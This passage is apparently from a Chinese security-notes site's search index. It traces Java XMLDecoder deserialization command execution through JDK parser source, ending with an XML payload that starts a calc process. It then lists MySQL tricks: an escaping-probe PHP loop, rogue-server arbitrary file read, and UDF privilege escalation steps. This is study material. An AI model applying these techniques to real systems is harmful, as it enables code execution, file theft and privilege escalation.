<p>\u4e5f\u5c31\u662f\u8bf4XMLDecoder\u53cd\u5e8f\u5217\u5316xml\u6570\u636e\u65f6\uff0c\u6570\u636e\u4e2d\u7684\u547d\u4ee4\u662f\u4f1a\u88ab\u6267\u884c\u7684\u3002</p> <p>left+\u5de6\u952e\u6253\u5f00\u51fd\u6570\u4f4d\u7f6e\uff0c\u6253\u4e0a\u65ad\u70b9\u5f00\u59cb\u8c03\u8bd5</p> <p>\u8fdb\u5165191\u884c\u7684parsingCompletes</p> <pre><code>    private boolean parsingComplete() {\n        if (this.input == null) {\n            return false;\n        }\n        if (this.array == null) {\n            if ((this.acc == null) &amp;&amp; (null != System.getSecurityManager())) {\n                throw new SecurityException(\"AccessControlContext is not set\");\n            }\n            AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() {\n                public Void run() {\n                    XMLDecoder.this.handler.parse(XMLDecoder.this.input);\n                    return null;\n                }\n            }, this.acc);\n            this.array = this.handler.getObjects();\n        }\n        return true;\n    }\n</code></pre> <p>\u518d\u8fdb\u5165\u5230parse\u4e2d</p> <pre><code>    public void parse(final InputSource input) {\n        if ((this.acc == null) &amp;&amp; (null != System.getSecurityManager())) {\n            throw new SecurityException(\"AccessControlContext is not set\");\n        }\n        AccessControlContext stack = AccessController.getContext();\n        SharedSecrets.getJavaSecurityAccess().doIntersectionPrivilege(new PrivilegedAction&lt;Void&gt;() {\n            public Void run() {\n                try {\n                    SAXParserFactory.newInstance().newSAXParser().parse(input, DocumentHandler.this);\n                }\n                catch (ParserConfigurationException exception) {\n                    handleException(exception);\n                }\n                catch (SAXException wrapper) {\n                    Exception exception = wrapper.getException();\n                    if (exception == null) {\n                        exception = wrapper;\n                    }\n                    handleException(exception);\n                }\n                catch (IOException exception) {\n                    handleException(exception);\n                }\n                return null;\n            }\n        }, stack, this.acc);\n    }\n</code></pre> <p>\u53c8\u8fdb\u5165\u5230\u53e6\u5916\u4e00\u4e2a\u7c7b\u7684parse\u65b9\u6cd5\u4e4b\u4e2d\uff1a</p> <pre><code>    public void parse(InputSource is, DefaultHandler dh)\n        throws SAXException, IOException {\n        if (is == null) {\n            throw new IllegalArgumentException(\"InputSource cannot be null\");\n        }\n        XMLReader reader = this.getXMLReader();\n        if (dh != null) {\n            reader.setContentHandler(dh);\n            reader.setEntityResolver(dh);\n            reader.setErrorHandler(dh);\n            reader.setDTDHandler(dh);\n        }\n        reader.parse(is);\n    }\n</code></pre> <p>\u8fd9\u91cc\u53c8\u8c03\u7528\u4e86xmlReader\u7236\u7c7bAbstractSAXParser\u7684parser\u65b9\u6cd5\u3002</p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdb\u6765\u5230\u8fd9\u91cc\uff0c\u4f46\u548c\u4ed6\u663e\u793a\u7684\u4e0d\u592a\u4e00\u6837</p> <p>\u53d1\u73b0\u5176\u5b9e\u662f\u8981\u8fdb\u4e00\u6b65\u5c55\u5f00\uff08\u56e0\u4e3a\u5b83\u67099\u79cd\u7ee7\u627f\u65b9\u5f0f\uff1f\uff09</p> <pre><code>    public void parse(InputSource inputSource)\n        throws SAXException, IOException {\n        // parse document\n        try {\n            XMLInputSource xmlInputSource =\n                new XMLInputSource(inputSource.getPublicId(),\n                                   inputSource.getSystemId(),\n                                   null, false);\n            xmlInputSource.setByteStream(inputSource.getByteStream());\n            xmlInputSource.setCharacterStream(inputSource.getCharacterStream());\n            xmlInputSource.setEncoding(inputSource.getEncoding());\n            parse(xmlInputSource);\n        }\n        // wrap XNI exceptions as SAX exceptions\n        catch (XMLParseException e) {\n            Exception ex = e.getException();\n            if (ex == null || ex instanceof CharConversionException) {\n                // must be a parser exception; mine it for locator info and throw\n                // a SAXParseException\n                LocatorImpl locatorImpl = new LocatorImpl() {\n                    public String getXMLVersion() {\n                        return fVersion;\n                    }\n                    // since XMLParseExceptions know nothing about encoding,\n                    // we cannot return anything meaningful in this context.\n                    // We *could* consult the LocatorProxy, but the\n                    // application can do this itself if it wishes to possibly\n                    // be mislead.\n                    public String getEncoding() {\n                        return null;\n                    }\n                };\n                locatorImpl.setPublicId(e.getPublicId());\n                locatorImpl.setSystemId(e.getExpandedSystemId());\n                locatorImpl.setLineNumber(e.getLineNumber());\n                locatorImpl.setColumnNumber(e.getColumnNumber());\n                throw (ex == null) ?\n                        new SAXParseException(e.getMessage(), locatorImpl) :\n                        new SAXParseException(e.getMessage(), locatorImpl, ex);\n            }\n            if (ex instanceof SAXException) {\n                // why did we create an XMLParseException?\n                throw (SAXException)ex;\n            }\n            if (ex instanceof IOException) {\n                throw (IOException)ex;\n            }\n            throw new SAXException(ex);\n        }\n        catch (XNIException e) {\n            Exception ex = e.getException();\n            if (ex == null) {\n                throw new SAXException(e.getMessage());\n            }\n            if (ex instanceof SAXException) {\n                throw (SAXException)ex;\n            }\n            if (ex instanceof IOException) {\n                throw (IOException)ex;\n            }\n            throw new SAXException(ex);\n        }\n    }\n</code></pre> <p>\u518d\u6b21\u8ddf\u8fdb\uff1a</p> <pre><code>public void parse(XMLInputSource inputSource)\nthrows XNIException, IOException;\n\u7ee7\u7eed\u5c55\u5f00\uff1a\npublic void parse(XMLInputSource source) throws XNIException, IOException {\n    if (fParseInProgress) {\n        // REVISIT - need to add new error message\n        throw new XNIException(\"FWK005 parse may not be called while parsing.\");\n    }\n    fParseInProgress = true;\n    try {\n        setInputSource(source);\n        parse(true);\n    } catch (XNIException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (IOException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (RuntimeException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (Exception ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw new XNIException(ex);\n    } finally {\n        fParseInProgress = false;\n        // close all streams opened by xerces\n        this.cleanup();\n    }\n} // parse(InputSource)\n</code></pre> <p>\u6700\u540e\u8fdb\u5165\u4e86XML11Configuration\u7c7b\u7684parse\u65b9\u6cd5\u3002</p>"},{"location":"web_bak/serialize/java/xmldecoder/#_1","title":"Xmldecoder","text":"<p>\u4ee5\u4e0a\u662fXML\u5904\u7406\u4e4b\u524d\u7684\u51fd\u6570\u5904\u7406</p> <p>XML\u6570\u636e\u7684\u5904\u7406\uff1a</p> <p>\u518d\u7ee7\u7eed\u8ddf\u8fdbXML11Configration</p> <p>\u4e0b\u9762\u7684\u51fd\u6570\u662f\uff1a</p> <pre><code>public boolean parse(boolean complete) throws XNIException, IOException {\n    //\n    // reset and configure pipeline and set InputSource.\n    if (fInputSource != null) {\n        try {\n            fValidationManager.reset();\n            fVersionDetector.reset(this);\n            fConfigUpdated = true;\n            resetSymbolTable();\n            resetCommon();\n            short version = fVersionDetector.determineDocVersion(fInputSource);\n            if (version == Constants.XML_VERSION_1_1) {\n                initXML11Components();\n                configureXML11Pipeline();\n                resetXML11();\n            } else {\n                configurePipeline();\n                reset();\n            }\n            // mark configuration as fixed\n            fConfigUpdated = false;\n            // resets and sets the pipeline.\n            fVersionDetector.startDocumentParsing((XMLEntityHandler) fCurrentScanner, version);\n            fInputSource = null;\n        } catch (IOException | RuntimeException ex) {\n            if (PRINT_EXCEPTION_STACK_TRACE)\n                ex.printStackTrace();\n            throw ex;\n        } catch (Exception ex) {\n            if (PRINT_EXCEPTION_STACK_TRACE)\n                ex.printStackTrace();\n            throw new XNIException(ex);\n        }\n    }\n    try {\n        return fCurrentScanner.scanDocument(complete);\n    } catch (IOException | RuntimeException ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw ex;\n    } catch (Exception ex) {\n        if (PRINT_EXCEPTION_STACK_TRACE)\n            ex.printStackTrace();\n        throw new XNIException(ex);\n    }\n}\n</code></pre> <p>\u5173\u6ce8\u70b9\u5728scanDocument\u5185</p> <p>\u51fd\u6570\u6709\u5f88\u591a\u5bf9XML\u683c\u5f0f\u7684\u89e3\u6790\u8fc7\u7a0b</p> <pre><code>public boolean scanDocument(boolean complete)\nthrows IOException, XNIException {\n    // keep dispatching \"events\"\n    fEntityManager.setEntityHandler(this);\n    //System.out.println(\" get Document Handler in NSDocumentHandler \" + fDocumentHandler );\n    int event = next();\n    do {\n        switch (event) {\n            case XMLStreamConstants.START_DOCUMENT :\n                //fDocumentHandler.startDocument(fEntityManager.getEntityScanner(),fEntityManager.getEntityScanner().getVersion(),fNamespaceContext,null);// not able to get\n                break;\n            case XMLStreamConstants.START_ELEMENT :\n                //System.out.println(\" in scann element\");\n                //fDocumentHandler.startElement(getElementQName(),fAttributes,null);\n                break;\n            case XMLStreamConstants.CHARACTERS :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.characters(getCharacterData(),null);\n                break;\n            case XMLStreamConstants.SPACE:\n                //check if getCharacterData() is the right function to retrieve ignorableWhitespace information.\n                //System.out.println(\"in the space\");\n                //fDocumentHandler.ignorableWhitespace(getCharacterData(), null);\n                break;\n            case XMLStreamConstants.ENTITY_REFERENCE :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                //entity reference callback are given in startEntity\n                break;\n            case XMLStreamConstants.PROCESSING_INSTRUCTION :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.processingInstruction(getPITarget(),getPIData(),null);\n                break;\n            case XMLStreamConstants.COMMENT :\n                fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                fDocumentHandler.comment(getCharacterData(),null);\n                break;\n            case XMLStreamConstants.DTD :\n                //all DTD related callbacks are handled in DTDScanner.\n                //1. Stax doesn't define DTD states as it does for XML Document.\n                //therefore we don't need to take care of anything here. So Just break;\n                break;\n            case XMLStreamConstants.CDATA:\n               fEntityScanner.checkNodeCount(fEntityScanner.fCurrentEntity);\n                if (fCDataStart) {\n                    fDocumentHandler.startCDATA(null);\n                    fCDataStart = false;\n                    fInCData = true;\n                }\n                fDocumentHandler.characters(getCharacterData(),null);\n                if (fCDataEnd) {\n                    fDocumentHandler.endCDATA(null);\n                    fCDataEnd = false;\n                }\n                break;\n            case XMLStreamConstants.NOTATION_DECLARATION :\n                break;\n            case XMLStreamConstants.ENTITY_DECLARATION :\n                break;\n            case XMLStreamConstants.NAMESPACE :\n                break;\n            case XMLStreamConstants.ATTRIBUTE :\n                break;\n            case XMLStreamConstants.END_ELEMENT :\n                //do not give callback here.\n                //this callback is given in scanEndElement function.\n                //fDocumentHandler.endElement(getElementQName(),null);\n                break;\n            default :\n                // Errors should have already been handled by the Scanner\n                return false;\n        }\n        //System.out.println(\"here in before calling next\");\n        event = next();\n        //System.out.println(\"here in after calling next\");\n    } while (event!=XMLStreamConstants.END_DOCUMENT &amp;&amp; complete);\n    if(event == XMLStreamConstants.END_DOCUMENT) {\n        fDocumentHandler.endDocument(null);\n        return false;\n    }\n    return true;\n} \n</code></pre> <p>\u7136\u540e\u8fdbnext()</p> <p>\u5230\u8fd9\u91cc\uff1a</p> <pre><code>public int next() throws IOException, XNIException {\n    return fDriver.next();\n}\n    public int next() throws IOException, XNIException {\n        try {\n            do {\n                switch (fScannerState) {\n                    case SCANNER_STATE_PROLOG: {\n                        fEntityScanner.skipSpaces();\n                        if (fEntityScanner.skipChar('&lt;', null)) {\n                            setScannerState(SCANNER_STATE_START_OF_MARKUP);\n                        } else if (fEntityScanner.skipChar('&amp;', NameType.REFERENCE)) {\n                            setScannerState(SCANNER_STATE_REFERENCE);\n                        } else {\n                            setScannerState(SCANNER_STATE_CONTENT);\n                        }\n                        break;\n                    }\n                    case SCANNER_STATE_START_OF_MARKUP: {\n                        fMarkupDepth++;\n                        if (isValidNameStartChar(fEntityScanner.peekChar()) ||\n                                isValidNameStartHighSurrogate(fEntityScanner.peekChar())) {\n                            setScannerState(SCANNER_STATE_ROOT_ELEMENT);\n                            setDriver(fContentDriver);\n                            //from now onwards this would be handled by fContentDriver,in the same next() call\n                            return fContentDriver.next();\n                        } else if (fEntityScanner.skipChar('!', null)) {\n                            if (fEntityScanner.skipChar('-', null)) {\n                                if (!fEntityScanner.skipChar('-', null)) {\n                                    reportFatalError(\"InvalidCommentStart\",\n                                            null);\n                                }\n                                setScannerState(SCANNER_STATE_COMMENT);\n                            } else if (fEntityScanner.skipString(DOCTYPE)) {\n                                setScannerState(SCANNER_STATE_DOCTYPE);\n                                Entity entity = fEntityScanner.getCurrentEntity();\n                                if(entity instanceof Entity.ScannedEntity){\n                                    fStartPos=((Entity.ScannedEntity)entity).position;\n                                }\n                                fReadingDTD=true;\n                                if(fDTDDecl == null)\n                                    fDTDDecl = new XMLStringBuffer();\n                                fDTDDecl.append(\"&lt;!DOCTYPE\");\n                            } else {\n                                reportFatalError(\"MarkupNotRecognizedInProlog\",\n                                        null);\n                            }\n                        } else if (fEntityScanner.skipChar('?', null)) {\n                            setScannerState(SCANNER_STATE_PI);\n                        } else {\n                            reportFatalError(\"MarkupNotRecognizedInProlog\",\n                                    null);\n                        }\n                        break;\n                    }\n                }\n            } while (fScannerState == SCANNER_STATE_PROLOG || fScannerState == SCANNER_STATE_START_OF_MARKUP );\n            switch(fScannerState){\n                /**\n                //this part is handled by FragmentContentHandler\n                case SCANNER_STATE_ROOT_ELEMENT: {\n                    //we have read '&lt;' and beginning of reading the start element tag\n                    setScannerState(SCANNER_STATE_START_ELEMENT_TAG);\n                    setDriver(fContentDriver);\n                    //from now onwards this would be handled by fContentDriver,in the same next() call\n                    return fContentDriver.next();\n                }\n                 */\n                case SCANNER_STATE_COMMENT: {\n                    //this function fills the data..\n                    scanComment();\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.COMMENT;\n                    //setScannerState(SCANNER_STATE_PROLOG);\n                    //break;\n                }\n                case SCANNER_STATE_PI: {\n                    fContentBuffer.clear() ;\n                    scanPI(fContentBuffer);\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.PROCESSING_INSTRUCTION;\n                }\n                case SCANNER_STATE_DOCTYPE: {\n                    if (fDisallowDoctype) {\n                        reportFatalError(\"DoctypeNotAllowed\", null);\n                    }\n                    if (fSeenDoctypeDecl) {\n                        reportFatalError(\"AlreadySeenDoctype\", null);\n                    }\n                    fSeenDoctypeDecl = true;\n                    // scanDoctypeDecl() sends XNI doctypeDecl event that\n                    // in SAX is converted to startDTD() event.\n                    if (scanDoctypeDecl(fSupportDTD)) {\n                        //allow parsing of entity decls to continue in order to stay well-formed\n                        setScannerState(SCANNER_STATE_DTD_INTERNAL_DECLS);\n                        fSeenInternalSubset = true;\n                        if(fDTDDriver == null){\n                            fDTDDriver = new DTDDriver();\n                        }\n                        setDriver(fContentDriver);\n                        //always return DTD event, the event however, will not contain any entities\n                        return fDTDDriver.next();\n                    }\n                    if(fSeenDoctypeDecl){\n                        Entity entity = fEntityScanner.getCurrentEntity();\n                        if(entity instanceof Entity.ScannedEntity){\n                            fEndPos = ((Entity.ScannedEntity)entity).position;\n                        }\n                        fReadingDTD = false;\n                    }\n                    // handle external subset\n                    if (fDoctypeSystemId != null) {\n                        if (((fValidation || fLoadExternalDTD)\n                            &amp;&amp; (fValidationManager == null || !fValidationManager.isCachedDTD()))) {\n                            if (fSupportDTD) {\n                                setScannerState(SCANNER_STATE_DTD_EXTERNAL);\n                            } else {\n                                setScannerState(SCANNER_STATE_PROLOG);\n                            }\n                            setDriver(fContentDriver);\n                            if(fDTDDriver == null) {\n                                fDTDDriver = new DTDDriver();\n                            }\n                            return fDTDDriver.next();\n                        }\n                    }\n                    else if (fExternalSubsetSource != null) {\n                        if (((fValidation || fLoadExternalDTD)\n                            &amp;&amp; (fValidationManager == null || !fValidationManager.isCachedDTD()))) {\n                            // This handles the case of a DOCTYPE that had neither an internal subset or an external subset.\n                            fDTDScanner.setInputSource(fExternalSubsetSource);\n                            fExternalSubsetSource = null;\n                        if (fSupportDTD)\n                            setScannerState(SCANNER_STATE_DTD_EXTERNAL_DECLS);\n                        else\n                            setScannerState(SCANNER_STATE_PROLOG);\n                        setDriver(fContentDriver);\n                        if(fDTDDriver == null)\n                            fDTDDriver = new DTDDriver();\n                        return fDTDDriver.next();\n                        }\n                    }\n                    // Send endDTD() call if:\n                    // a) systemId is null or if an external subset resolver could not locate an external subset.\n                    // b) \"load-external-dtd\" and validation are false\n                    // c) DTD grammar is cached\n                    // in XNI this results in 3 events:  doctypeDecl, startDTD, endDTD\n                    // in SAX this results in 2 events: startDTD, endDTD\n                    if (fDTDScanner != null) {\n                        fDTDScanner.setInputSource(null);\n                    }\n                    setScannerState(SCANNER_STATE_PROLOG);\n                    return XMLEvent.DTD;\n                }\n                case SCANNER_STATE_CONTENT: {\n                    reportFatalError(\"ContentIllegalInProlog\", null);\n                    fEntityScanner.scanChar(null);\n                    return -1;\n                }\n                case SCANNER_STATE_REFERENCE: {\n                    reportFatalError(\"ReferenceIllegalInProlog\", null);\n                    return -1;\n                }\n                /**\n                 * if (complete) {\n                 * if (fEntityScanner.scanChar() != '&lt;') {\n                 * reportFatalError(\"RootElementRequired\", null);\n                 * }\n                 * setScannerState(SCANNER_STATE_ROOT_ELEMENT);\n                 * setDriver(fContentDriver);\n                 * }\n                 */\n            }\n        }\n        // encoding errors\n        catch (MalformedByteSequenceException e) {\n            fErrorReporter.reportError(e.getDomain(), e.getKey(),\n                    e.getArguments(), XMLErrorReporter.SEVERITY_FATAL_ERROR, e);\n            return -1;\n        } catch (CharConversionException e) {\n            fErrorReporter.reportError(\n                    XMLMessageFormatter.XML_DOMAIN,\n                    \"CharConversionFailure\",\n                    null,\n                    XMLErrorReporter.SEVERITY_FATAL_ERROR, e);\n            return -1;\n        }\n        // premature end of file\n        catch (EOFException e) {\n            reportFatalError(\"PrematureEOF\", null);\n            //xxx  what should be returned here.... ???\n            return -1 ;\n            //throw e;\n        }\n        //xxx  what should be returned here.... ???\n        return -1;\n    }\n\n} // class PrologDriver\n</code></pre> <p>\u5e94\u8be5\u662f\u8fdb\u5165\u8fd9\u4e2a\u4f4d\u7f6e</p> <p>\u7136\u540e\u63a8\u8350\u8bbe\u4e2a\u65ad\u70b9\u5728\u8fdb\u51fd\u6570\u7684\u5f00\u59cb\u5904\uff0c\u56e0\u4e3a\u5176\u4e2d\u4f1a\u6709\u4e00\u4e2anext()\u5faa\u73af\u4f1a\u5faa\u73af\u975e\u5e38\u591a\u6b21\uff0813\u6b21\u5de6\u53f3\uff09\uff0c\u8981\u5728\u5f39\u51fa\u6765\u4e4b\u524d\uff08\u6307\u90a3\u4e2a\u8ba1\u7b97\u5668\uff09\u4f1a\u89c1\u5230\u8fd9\u6837\u4e00\u4e2a\u51fd\u6570\u65b9\u6cd5\uff1a</p> <p>.png)</p> <p>\u7ee7\u7eed\u8ddf\u8fdb\uff1a</p> <p></p> <p>\u7ec8\u4e8e\u627e\u5230\u4e86endElement\u65b9\u6cd5\u3002</p> <p>\u7f51\u56fe\u8fd9\u6bb5\u4ee3\u7801\u7684\u903b\u8f91\uff1a</p> <p></p> <p>\u5355\u6b65\u8c03\u8bd5\u6765\u5230\u8fd9\u4e2a\u4f4d\u7f6e\uff0c\u5728AbstractSAXParser\u7c7b\u4e4b\u4e0b</p> <pre><code>public void endElement(QName element, Augmentations augs) throws XNIException {\n\n    try {\n        // SAX1\n        if (fDocumentHandler != null) {\n            fDocumentHandler.endElement(element.rawname);\n        }\n        // SAX2\n        if (fContentHandler != null) {\n            fAugmentations = augs;\n            String uri = element.uri != null ? element.uri : \"\";\n            String localpart = fNamespaces ? element.localpart : \"\";\n            fContentHandler.endElement(uri, localpart,\n                                       element.rawname);\n            if (fNamespaces) {\n                endNamespaceMapping();\n            }\n        }\n    }\n    catch (SAXException e) {\n        throw new XNIException(e);\n    }\n} // endElement(QName)\n</code></pre> <p>\u7ee7\u7eedF7\u5355\u6b65\u8c03\u8bd5\u6765\u5230\u8fd9\u91cc\uff1a</p> <pre><code>public void endElement(String uri, String localName, String qName) {\n    try {\n        this.handler.endElement();\n    }\n    catch (RuntimeException exception) {\n        handleException(exception);\n    }\n    finally {\n        this.handler = this.handler.getParent();\n    }\n}\n</code></pre> <p>\u63a5\u4e0b\u6765\u5c31\u4e0d\u662f\u5355\u6b65\u8c03\u8bd5\u4e86</p> <p>\u70b9\u8fdb\u53bb</p> <p>\u8fd9\u91cc\u7684handler\u662fStringElementHandler\uff0c\u4f46\u662f\u8fd9\u4e2a\u7c7b\u6ca1\u6709\u91cd\u5199endElement\u65b9\u6cd5\uff0c\u6240\u4ee5\u8c03\u7528\u7684\u662f\u7236\u7c7bElementHandler\u7684endElement\u65b9\u6cd5\uff0c\u5176\u4e2d\u8c03\u7528\u4e86getValueObject\u6765\u83b7\u53d6\u6807\u7b7e\u4e2d\u7684value\u503c\uff0c\u8fd9\u91cc\u7684\u6807\u7b7e\u662fstring\u6807\u7b7e\uff0c\u6240\u4ee5\u83b7\u53d6\u5230\u7684\u503c\u662fcalc\u3002</p> <p>\u4e5f\u5c31\u662f\u7236\u7c7b\u7684</p> <pre><code>public void endElement() {\n    // do nothing if no value returned\n    ValueObject value = getValueObject();\n    if (!value.isVoid()) {\n        if (this.id != null) {\n            this.owner.setVariable(this.id, value.getValue());\n        }\n        if (isArgument()) {\n            if (this.parent != null) {\n                this.parent.addArgument(value.getValue());\n            } else {\n                this.owner.addObject(value.getValue());\n            }\n        }\n    }\n}\n</code></pre> <p>\u7136\u540e\u5c06\u5176\u6dfb\u52a0\u5230\u5176\u7236\u7c7b\u6807\u7b7eVoidElementHandler\u7684Argument\u5c5e\u6027\u4e2d\u3002</p> <p>\u7136\u540e\u5c06handler\u6307\u5411\u5176\u7236\u7c7bVoidElementHandler\u3002</p> <pre><code>ValueObject value = getValueObject();\n</code></pre> <p>\u7ee7\u7eed\u89e3\u6790\u5230void\u6807\u7b7e\uff0c\u6b64\u65f6\u7684handler\u5c31\u662fVoidElementHandler\uff0c\u63a5\u7740\u8c03\u7528getValueObject\u3002\u4f46\u662f\u56e0\u4e3a\u6ca1\u6709\u91cd\u5199\u8be5\u65b9\u6cd5\uff0c\u6240\u4ee5\u8c03\u7528\u7236\u7c7bNewElementHandler\u7684getValueObject\u3002</p> <p>\u7ee7\u7eed\u8ddf\u8fdb\u53d1\u73b0\u5b9e\u73b0\u4e86\u53cd\u5c04\u8c03\u7528invoke\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u6267\u884c\u4e86set\u65b9\u6cd5\u3002\u63a5\u7740\u518d\u89e3\u6790Array\u6807\u7b7e\uff0c\u6309\u7167\u4e0a\u9762\u7684\u6b65\u9aa4\u89e3\u6790\uff0c\u5c31\u5b8c\u6210\u4e86\u8fd9\u4e00\u90e8\u5206\u53c2\u6570\u7684\u89e3\u6790\u3002</p> <p></p> <p></p> <p></p> <pre><code>&lt;array class=\"java.lang.String\"length=\"1\"&gt;\n  &lt;void index=\"0\"&gt;\n      &lt;string&gt;calc&lt;/string&gt;\n  &lt;/void&gt;\n&lt;/array&gt;\n</code></pre> <p>\u90a3\u4e48\u518d\u6309\u7167\u4e0a\u9762\u7684\u6b65\u9aa4\u89e3\u6790object\u6807\u7b7e\uff0c\u7136\u540e\u8c03\u7528new \u65b9\u6cd5\u5b9e\u4f8b\u5316 ProcessBuilder\u7c7b\u3002</p> <p>\u7136\u540e\u89e3\u6790\u5230void\u6807\u7b7e\u83b7\u53d6\u5230start\u65b9\u6cd5\uff0c\u7136\u540e\u901a\u8fc7\u8c03\u7528start\u65b9\u6cd5\u5b9e\u73b0\u4e86\u547d\u4ee4\u6267\u884c\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\u3002</p> <p>\u4e5f\u5c31\u76f8\u5f53\u4e8e\u6700\u540e\u62fc\u63a5\u4e86 new java.lang.ProcessBuilder(new String[]{\"calc\"}).start();</p> <p></p> <p>\u6700\u540e\u6765\u6574\u7406\u4e00\u4e0b\uff1a</p> <p>1.\u51fa\u73b0\u95ee\u9898\u7684\u539f\u56e0\u662f\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u65b9\u6cd5\u6ca1\u6709\u91cd\u5199\uff0c\u5bfc\u81f4\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\u5e76\u4e14\u62fc\u63a5\u5199\u5165\u4e86\u5bf9\u5e94\u7684\u6570\u636e\u4e2d</p> <p>2.\u6f0f\u6d1e\u539f\u7406\u662fJAVA\u5bf9XML\u6587\u4ef6\u7684\u89e3\u6790\u662f\u5206\u6bb5\u5206\u5f00\u7684\uff0c\u5229\u7528\u89e3\u6790\u8fc7\u7a0b\u4e2d\u8c03\u7528\u5230\u7684creat\u548cgetvalue\u7684\u62fc\u63a5\u80fd\u591f\u5f97\u5230\u60f3\u8981\u7684\u6570\u636e\u3002</p> <p>3.\u4e0d\u6e05\u695a\u662f\u5426\u8fd8\u6709\u5176\u4ed6\u7684\u5165\u53e3\uff0c\u4f46\u8fd9\u91cc\u7684\u5173\u952e\u8bed\u53e5\u5176\u5b9e\u662f\uff1a</p> <pre><code>\u00a0 \u00a0 \u00a0 \u00a0 Object o = xmlDecoder.readObject();\n</code></pre>"},{"location":"web_bak/serialize/java/xmldecoder/#_2","title":"\u7f16\u8f91\uff1a\u5f90\u5f00\u8c6a","text":""},{"location":"web_bak/serialize/java/xmldecoder/#_3","title":"\u5ba1\u6838\uff1a\u5f90\u5f00\u8c6a","text":""},{"location":"web_bak/sql/little_trick/","title":"little trick","text":""},{"location":"web_bak/sql/little_trick/#_1","title":"\u7279\u6b8a\u5b57\u7b26","text":"<pre><code>&lt;?php\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db (\"test\");\nmysql_query(\"set names utf8\");\nfor($i = 0 ; $i &lt; 256 ; $i++){\n    $c = chr($i);\n    $name = mysql_real_escape_string('hehe' . $c);\n    $sql = \"SELECT * FROM `name` WHERE `name` = '{$name}'\";\n    $row = mysql_fetch_array(mysql_query($sql));\n    if ($row['name'] == 'aa') {\n        echo \"{$c} &lt;br/&gt;\";\n    }\n}\n</code></pre> <p>\u4e00\u4e2a\u5c0ftrick</p> <p>\u81ea\u5df1\u8dd1\u4e00\u8dd1\u5c31\u77e5\u9053\u662f\u4ec0\u4e48\u610f\u601d\u4e86</p> <p>mysql\u67e5\u8be2\u51fa\u6765\u7684\u6570\u636e\u6bd4\u5982$id</p> <p>$id=a</p> <p>$id=a+\u4efb\u610f\u4e0b\u56fe\u91cc\u9762\u7684\u5b57\u7b26</p> <p></p> <p></p>"},{"location":"web_bak/sql/little_trick/#mysql","title":"mysql\u4efb\u610f\u6587\u4ef6\u8bfb","text":"<p>\u539f\u7406\uff1a</p> <p>\u5f53\u670d\u52a1\u7aef\u6267\u884cload data local infile\u65f6\uff0c\u4f1a\u4ece\u5ba2\u6237\u7aef\u4f1a\u8bfb\u53d6\u5bf9\u5e94\u7684\u6587\u4ef6\u3002 //load data infile\u5219\u662f\u4ece\u670d\u52a1\u7aef\u672c\u8eab\u8bfb\u53d6</p> <ol> <li> <p>mysql\u5ba2\u6237\u7aef\u8fde\u63a5\u670d\u52a1\u7aef\u65f6\uff0c\u670d\u52a1\u7aef\u53ef\u4ee5\u8ba9\u5ba2\u6237\u7aef\u6267\u884csql\u8bed\u53e5\uff0c</p> </li> <li> <p>\u6240\u4ee5\u4f2a\u9020\u4e00\u4e2a\u670d\u52a1\u7aef\uff0c\u8ba9\u5ba2\u6237\u7aef\u8fde\u63a5\u5e76\u6267\u884cload data local infile\u5373\u53ef\u4efb\u610f\u6587\u4ef6\u8bfb\u3002</p> </li> </ol> <p>https://github.com/ev0A/Mysqlist</p> <p>\u4f8b\u5b50: phpmyadmin\u5f00\u542f\u8fdc\u7a0b\u767b\u9646\u540e\u5c31\u4f1a\u51fa\u73b0\u8be5\u6f0f\u6d1e\uff08\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8eweb\u7684sql\u7ba1\u7406\u8f6f\u4ef6\uff09</p>"},{"location":"web_bak/sql/little_trick/#udf","title":"udf\u63d0\u6743","text":"<p>\u8fd9\u4e2a\u6211\u4e0d\u4f1a\uff0c\u6240\u4ee5copy\u4e0b\u6765\u4e86</p> <p>\u5982\u679c\u7406\u89e3\u4e0d\u4e86\u53ef\u4ee5\u7c7b\u6bd4\u4e4b\u524d\u6240\u63cf\u8ff0\u7684linux\u4e0b\u7684ld_preload</p> <p>\u5927\u81f4\u6d41\u7a0b\u5982\u4e0b\uff0c\u5c06udf\u6587\u4ef6windows\u4e3adll\u6587\u4ef6 ,linux\u4e3aso\u6587\u4ef6\u5bfc\u5165\u670d\u52a1\u5668mysql\u63d2\u4ef6\u76ee\u5f55\u5373\u53ef\u3002</p> <p>\u53ef\u4ee5\u81ea\u5df1\u5199\u4e00\u4e9budf\u6587\u4ef6\u6765\u7f16\u8bd1\u3002</p> <p>\u63a8\u8350sqlmap\u63d0\u4f9b\u7684udf\u6587\u4ef6</p> <p>https://github.com/sqlmapproject/sqlmap/tree/master/data/udf</p> <p>\u56e0\u4e3audf\u6587\u4ef6\u8f83\u5927\uff0c\u8be6\u7ec6\u70b9\u51fb\u8fd9\u91cc</p> <p>https://files.cnblogs.com/files/kagari/udf.js</p> <p>\u9ad8\u7248\u672c\u4e2dmysql\u65e0\u6cd5\u5411/usr\u76ee\u5f55\u5199\u6587\u4ef6\uff0c\u53ef\u4ee5\u5bfc\u5165\u5230/tmp\uff0c\u4e4b\u540emv\u5230/usr/lib/mysql/plugin\u4e0b</p> 